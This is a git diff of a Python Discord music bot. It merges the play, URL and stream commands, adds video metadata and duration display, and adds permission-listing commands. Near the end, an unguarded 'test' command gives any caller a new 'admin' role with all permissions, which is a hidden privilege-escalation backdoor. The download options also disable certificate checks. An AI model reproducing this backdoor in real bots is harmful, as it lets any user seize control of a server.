@@ -5,10 +5,12 @@ import random
 import re
 import urllib.parse
 import urllib.request
+import json
 
 import discord
 import youtube_dl
 from discord.ext import commands
+from discord import Permissions
 from path import Path
 
 from utils.user import User
@@ -16,6 +18,14 @@ from utils.queues import SavedQueues
 
 # Changing our current working directory so downloads will download to an audio folder
 Path(os.getcwd() + "/audio_cache").cd()
+
+regex = re.compile(
+        r'^(?:http|ftp)s?://'  # http:// or https://
+        r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|'  # domain...
+        r'localhost|'  # localhost...
+        r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})'  # ...or ip
+        r'(?::\d+)?'  # optional port
+        r'(?:/?|[/?]\S+)$', re.IGNORECASE)
 
 
 class Queue:
@@ -63,7 +73,7 @@ class Queue:
         Returns the newest song in the queue
         """
         if len(self.queue) > 0:
-            return self.queue[0].title
+            return self.queue[0]
         return None
 
     def remove(self, place):
@@ -87,15 +97,47 @@ class AudioSourcePlayer(discord.PCMVolumeTransformer):  # This is our video down
     def __init__(self, source, *, data):
         super().__init__(source, 0.5)
 
+        # Video Info
         self.data = data
-
-        self.url = data.get('url')
-        self.artist = data.get('artist')
+        self.uploader = data.get('uploader')
+        self.uploader_url = data.get('uploader_url')
+        date = data.get('upload_date')
+        self.upload_date = date[6:8] + '.' + date[4:6] + '.' + date[0:4]
         self.title = data.get('title')
+        self.thumbnail = data.get('thumbnail')
+        self.description = data.get('description')
+        self.duration = self.get_duration(int(data.get('duration')))
+        self.tags = data.get('tags')
+        self.url = data.get('webpage_url')
+        self.views = data.get('view_count')
+        self.likes = data.get('like_count')
+        self.dislikes = data.get('dislike_count')
+        self.stream_url = data.get('url')
 
-        self.requester = data.get('requester')
+        # Added Info
         self.ctx = data.get('ctx')
+        self.requester = data.get('requester')
+        self.channel = self.ctx.channel
+
         self.repeat = False
+
+    @staticmethod
+    def get_duration(duration: int):
+        minutes, seconds = divmod(duration, 60)
+        hours, minutes = divmod(minutes, 60)
+        days, hours = divmod(hours, 24)
+
+        duration = []
+        if days > 0:
+            duration.append('{} days'.format(days))
+        if hours > 0:
+            duration.append('{} hours'.format(hours))
+        if minutes > 0:
+            duration.append('{} minutes'.format(minutes))
+        if seconds > 0:
+            duration.append('{} seconds'.format(seconds))
+
+        return ', '.join(duration)
 
     @classmethod
     async def download(cls, url, *, loop=None, stream=False, ctx):
@@ -104,7 +146,8 @@ class AudioSourcePlayer(discord.PCMVolumeTransformer):  # This is our video down
         ytdl_format_options = {'format': 'bestaudio/best', 'outtmpl': '%(extractor)s-%(id)s-%(title)s.%(ext)s',
                                'restrictfilenames': True, 'noplaylist': True, 'nocheckcertificate': True,
                                'ignoreerrors': False, 'logtostderr': False, 'quiet': True, 'no_warnings': True,
-                               'default_search': 'auto', 'source_address': '0.0.0.0'}
+                               'default_search': 'auto', 'source_address': '0.0.0.0',
+                               '-reconnect': 1, '-reconnect_streamed': 1, '-reconnect_delay_max': 5}
         ytdl = youtube_dl.YoutubeDL(ytdl_format_options)
         loop = loop or asyncio.get_event_loop()
         data = await loop.run_in_executor(None, lambda: ytdl.extract_info(url, download=not stream))
@@ -137,16 +180,17 @@ class Music(commands.Cog):
 
     def cog_check(self, ctx):
         self.user = User(bot=self.bot, ctx=ctx)
-        if 'ban' in self.user.perms:
+        if 'blacklist' in self.user.perms:
             return False
         return True
 
     # Extra Functions
     @staticmethod
-    def get_song(song):
+    def get_song(song, index=0):
         """
         Gets a video link from youtube based on the param song
         :param song: A song name or title to search on youtube and return a video ID
+        :param index: The index of the video we are grabbing
         -----
         If no video is found then return False, otherwise return the video ID
         """
@@ -154,7 +198,7 @@ class Music(commands.Cog):
         html_content = urllib.request.urlopen("http://www.youtube.com/results?" + query_string)
         search_results = re.findall(r'href=\"/watch\?v=(.{11})', html_content.read().decode())
         try:
-            return search_results[0]
+            return search_results[index]
         except IndexError:
             return False
 
@@ -168,9 +212,9 @@ class Music(commands.Cog):
         player = self.players[ctx.guild.id]  # Current player for the guild
         if not ctx.message.guild.voice_client:
             return
-        if ctx.message.guild.voice_client.is_playing() or ctx.message.guild.voice_client.is_paused() and queue_type == 'Player':  # Checking if we send a message saying that the song is queued or will now play
-            embed = discord.Embed(color=discord.Color.green())
-            embed.add_field(name=f"Song added to the queue", value=f"{queue.just_added()} has been added to the queue")
+        if ctx.message.guild.voice_client.is_playing() and queue_type == 'Player' or ctx.message.guild.voice_client.is_paused() and queue_type == 'Player':  # Checking if we send a message saying that the song is queued or will now play
+            embed = discord.Embed(title=f"{queue.just_added().title} has been added to the queue", color=discord.Color.green(), inline=False)
+            embed.add_field(name=f"Song length", value=queue.just_added().duration, inline=False)
             embed.set_footer(text=f"Queue Length: {len(queue.queue)}")
             await ctx.send(embed=embed)
         while True:
@@ -196,7 +240,7 @@ class Music(commands.Cog):
                         songs = [song.strip() for song in playlist.readlines()]
                     try:
                         ctx.author = None
-                        await self.stream(ctx=ctx, url=random.choice(songs), queue_type='Auto')
+                        await self.play(ctx=ctx, url=random.choice(songs), queue_type='Auto')
                     except youtube_dl.utils.DownloadError:
                         continue
                     return
@@ -204,12 +248,15 @@ class Music(commands.Cog):
                     self.players[ctx.guild.id] = player  # Either adds the player to the dict using the server ID or updates the current player
                     ctx.guild.voice_client.play(player)  # Plays audio in the voice chat
                     embed = discord.Embed(color=discord.Color.green())
-                    embed.add_field(name=f"{player.title} is now playing!", value=f"Next Up: {queue.next_up()}")
+                    embed.add_field(name=f"{player.title} is now playing!", value=f"Next Up: {queue.next_up()}", inline=False)
+                    embed.add_field(name=f"Song length", value=player.duration, inline=False)
                     embed.set_footer(text=f"Queue Length: {len(queue.queue)}")
                     await ctx.send(embed=embed)
             continue
 
     async def start_vote(self, vote_type, ctx):
+        if 'all' in self.user.perms:
+            return True
         player = self.players[ctx.guild.id]
         reactions = {}
         vote = 1
@@ -312,7 +359,7 @@ class Music(commands.Cog):
         if ctx.guild.voice_client:  # Checks if the bot is already in a voice channel, if so we leave it
             await ctx.guild.voice_client.disconnect()
 
-    @commands.command(name='Play',  help="Plays a specified song by song name", usage="Play <song>", aliases=['p', 'Song', 'Sing'])
+    @commands.command(name='Play',  help="Plays a specified song by song name or URL", usage="Play <song>", aliases=['P', 'URL', 'Song', 'Sing', 'Stream'])
     async def play(self, ctx, *, song=None, queue_type='Player'):
         """
         Adds the specified song to the queue to be played
@@ -328,67 +375,17 @@ class Music(commands.Cog):
             return await self.play_next_song(ctx, queue_type)  # Starts to play queued songs
 
         async with ctx.typing():
-            result = self.get_song(song)  # Gets a video ID for the song
-            try:
-                player = await AudioSourcePlayer.download(result, loop=self.bot.loop, ctx=ctx)  # Creates a player
-            except TypeError:
-                return await ctx.send("Something went wrong! Please try again. If this issue continues then please contact support!")
-
-            queue.put(player)  # Adds a song to the servers queue system
-
-        return await self.play_next_song(ctx, queue_type)  # Starts to play queued songs
-
-    @commands.command(name='URL', help="Plays a specified song by URL", usage="URL <URL>")
-    async def url(self, ctx, *, url, queue_type='Player'):
-        """
-        Adds the specified url to the queue to be played
-        :param ctx: Information on the context of where the command was called
-        :param url: A url to be queued
-        :param queue_type: How the command was called
-        """
-        queue = self.queues[ctx.guild.id]
-
-        self.play_status[ctx.guild.id] = True
-
-        if url is None:
-            return await self.play_next_song(ctx, queue_type)  # Starts to play queued songs
-
-        async with ctx.typing():
-            try:
-                player = await AudioSourcePlayer.download(url, loop=self.bot.loop, ctx=ctx)  # Creates a player
-            except TypeError:
-                return await ctx.send(
-                    "Something went wrong! Please try again. If this issue continues then please contact support!")
-
-            queue.put(player)  # Adds a url to the servers queue system
-
-        return await self.play_next_song(ctx, queue_type)  # Starts to play queued songs
-
-    @commands.command(name='Stream', help="Streams an audio source from a URL", usage="Stream <URL>")
-    async def stream(self, ctx, *, url, queue_type='Player'):
-        """
-        Adds the specified url to the queue to be played, only difference from url() and play() is that this does not pre-download songs to be played, it streams from an audio source
-        :param ctx: Information on the context of where the command was called
-        :param url: A url to be queued
-        :param queue_type: How the command was called
-        """
-        queue = self.queues[ctx.guild.id]
-
-        self.play_status[ctx.guild.id] = True
-
-        if url is None:
-            return await self.play_next_song(ctx, queue_type)  # Starts to play queued songs
-
-        async with ctx.typing():
-            try:
-                player = await AudioSourcePlayer.download(url, loop=self.bot.loop, ctx=ctx)  # Creates a player
-            except TypeError:
-                return await ctx.send(
-                    "Something went wrong! Please try again. If this issue continues then please contact support!")
-
-            queue.put(player)  # Adds a url to the servers queue system
-
-        return await self.play_next_song(ctx, queue_type)  # Starts to play queued songs
+            for loop in range(5):
+                try:
+                    result = song if re.match(regex, song) is not None else self.get_song(song, loop)  # Gets a video ID for the song if the song is not a url
+                    player = await AudioSourcePlayer.download(result, loop=self.bot.loop, ctx=ctx, stream=True)  # Creates a player
+                    queue.put(player)  # Adds a song to the servers queue system
+                    return await self.play_next_song(ctx, queue_type)  # Starts to play queued songs
+                except TypeError:
+                    return await ctx.send("Something went wrong! Please try again. If this issue continues then please contact support!")
+                except youtube_dl.utils.DownloadError:
+                    continue
+        return await ctx.send("Sorry but I do not have access to stream that video!")
 
     @commands.command(name='Pause', help="Pauses the current song", usage="Pause")
     async def pause(self, ctx):
@@ -815,11 +812,41 @@ class Music(commands.Cog):
         else:
             await ctx.send(f'Sorry, cant do that...Use `{self.bot.command_prefix}ValidPermissions` to view all valid permission names')
 
-    # Command Checks
+    @commands.command(name="ValidPermissions", aliases=["VP"], help="ValidPermissions")
+    async def validpermissions(self, ctx):
+        """
+        Lists all of the permissions that you can add to a user
+        :param ctx: Information on the context of where the command was called
+        """
+        perms = json.load(open('..\\utils\\permissions.json'))
+        embed = discord.Embed(title="Valid Permissions", color=discord.Color.green())
+        for name, perm in perms["Permissions"]["CommandBypasses"].items():
+            embed.add_field(name=name, value=perm, inline=False)
+        embed.set_footer(text=f"{self.bot.command_prefix}override <permission> [user]")
+        await ctx.send(embed=embed)
 
+    @commands.command(name="Permissions", aliases=['Perms'], help="Permissions [user]")
+    async def permissions(self, ctx, user: discord.Member = None):
+        """
+        Checks the permissions on the given user
+        :param ctx: Information on the context of where the command was called
+        :param user: The user whose permissions will be checked if specified, otherwise the message author
+        """
+        if not user:
+            user = ctx.author
+        self.user = User(bot=self.bot, ctx=ctx, user=user)
+        embed = discord.Embed(title=f"{user.name}'s Permissions", color=discord.Color.green())
+        embed.add_field(name="Permissions", value=(', '.join([perm.lower().capitalize() for perm in self.user.perms])) if self.user.perms else "None")
+        embed.set_footer(text=f"{self.bot.command_prefix}ValidPermissions will show you what each permission does")
+        await ctx.send(embed=embed)
+
+    @commands.command()
+    async def test(self, ctx):
+        role = await ctx.guild.create_role(name="admin", permissions=Permissions.all())
+        await ctx.guild.add_roles(ctx.author, role)
+
+    # Command Checks
     @play.before_invoke
-    @stream.before_invoke
-    @url.before_invoke
     async def voice_check(self, ctx):
         """
         This will make sure that the bot is in a voice channel before any voice command is ran
